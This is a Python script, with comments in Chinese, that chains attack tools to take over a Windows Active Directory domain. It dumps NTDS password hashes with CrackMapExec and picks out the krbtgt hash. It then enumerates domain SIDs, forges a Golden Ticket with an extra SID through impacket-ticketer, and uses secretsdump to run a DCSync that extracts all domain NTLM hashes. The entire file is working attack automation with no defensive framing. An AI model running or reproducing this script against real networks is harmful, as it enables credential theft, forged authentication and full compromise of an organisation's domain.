
import argparse
import subprocess
import sys

def run_cmd(cmd, shell=False):
    """
    执行命令并返回输出结果。如果失败，则退出脚本。
    """
    print(f"[+] 执行命令: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, check=True)
        print(result.stdout)
        if result.stderr:
            print("【错误输出】", result.stderr)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] 命令执行失败: {e}")
        print(e.stdout)
        print(e.stderr)
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="使用 LDAP、CrackMapExec、lookupsid 以及 impacket 工具生成 Golden Ticket 并进行 DCSync")
    
    # LDAP 参数
    parser.add_argument("--ldap-server", required=True, help="LDAP 服务器地址")
    parser.add_argument("--ldap-user", required=True, help="LDAP 用户")
    parser.add_argument("--ldap-pass", required=True, help="LDAP 密码")
    parser.add_argument("--base-dn", required=True, help="LDAP 基础 DN")
    parser.add_argument("--ldap-filter", default="(objectClass=trustedDomain)", help="LDAP 查询过滤器，默认 (objectClass=trustedDomain)")
    
    # SMB 和 CrackMapExec 参数
    parser.add_argument("--smb-target", required=True, help="SMB 目标地址")
    parser.add_argument("--smb-user", required=True, help="SMB 用户")
    parser.add_argument("--smb-pass", required=True, help="SMB 密码")
    
    # lookupsid 参数
    parser.add_argument("--alternate-dc", required=True, help="备用 DC 地址，用于第二次 lookupsid 查询")
    
    # Golden Ticket 参数
    parser.add_argument("--domain-sid", required=True, help="域 SID")
    parser.add_argument("--extra-sid", required=True, help="额外 SID")
    parser.add_argument("--krbtgt-nthash", required=True, help="krbtgt 用户的 nthash")
    parser.add_argument("--domain-name", required=True, help="域名")
    parser.add_argument("--golden-user", required=True, help="用于生成 Golden Ticket 的用户名")
    
    # secretsdump 参数
    parser.add_argument("--secretsdump-dc", required=True, help="secretsdump 目标 DC 的 FQDN")
    
    args = parser.parse_args()
    
    # 第一步：LDAP 查询 trustedDomain 对象
    ldap_cmd = [
        "ldapsearch", "-H", f"ldap://{args.ldap_server}", "-x",
        "-D", args.ldap_user, "-w", args.ldap_pass,
        "-b", args.base_dn, args.ldap_filter
    ]
    print("===== 第一步：LDAP 查询 =====")
    run_cmd(ldap_cmd)
    
    # 第二步：使用 CrackMapExec 枚举 NTDS（过滤 krbtgt）
    cme_cmd = [
        "sudo", "crackmapexec", "smb", args.smb_target,
        "-u", args.smb_user, "-p", args.smb_pass, "--ntds"
    ]
    print("===== 第二步：CrackMapExec 枚举 NTDS，过滤 krbtgt =====")
    output = run_cmd(cme_cmd)
    for line in output.splitlines():
        if "krbtgt" in line:
            print(line)
    
    # 第三步：使用 lookupsid.py 查询域 SID（DC = ldap_server）
    lookupsid_cmd1 = [
        "python3", "lookupsid.py",
        "-domain-sids", f"{args.domain_name}/{args.smb_user}:{args.smb_pass}@{args.ldap_server}", "0"
    ]
    print("===== 第三步：lookupsid.py 查询域 SID（DC = ldap_server） =====")
    run_cmd(lookupsid_cmd1)
    
    # 第四步：使用 lookupsid.py 查询域 SID（DC = alternate_dc）
    lookupsid_cmd2 = [
        "python3", "lookupsid.py",
        "-domain-sids", f"{args.domain_name}/{args.smb_user}:{args.smb_pass}@{args.alternate_dc}", "0"
    ]
    print("===== 第四步：lookupsid.py 查询域 SID（DC = alternate_dc） =====")
    run_cmd(lookupsid_cmd2)
    
    # 第五步：使用 impacket-ticketer 生成 Golden Ticket
    ticketer_cmd = [
        "sudo", "impacket-ticketer",
        "-nthash", args.krbtgt_nthash,
        "-domain-sid", args.domain_sid,
        "-domain", args.domain_name,
        "-extra-sid", args.extra_sid,
        args.golden_user
    ]
    print("===== 第五步：生成 Golden Ticket =====")
    run_cmd(ticketer_cmd)
    
    # 第六步：使用 impacket-secretsdump 利用 Golden Ticket 进行 DCSync
    secretsdump_cmd = [
        "sudo", "impacket-secretsdump", "-k", "-no-pass", "-just-dc-ntlm",
        f"{args.domain_name}/{args.golden_user}@{args.secretsdump_dc}"
    ]
    print("===== 第六步：使用 secretsdump 利用 Golden Ticket =====")
    run_cmd(secretsdump_cmd)

if __name__ == "__main__":
    main()
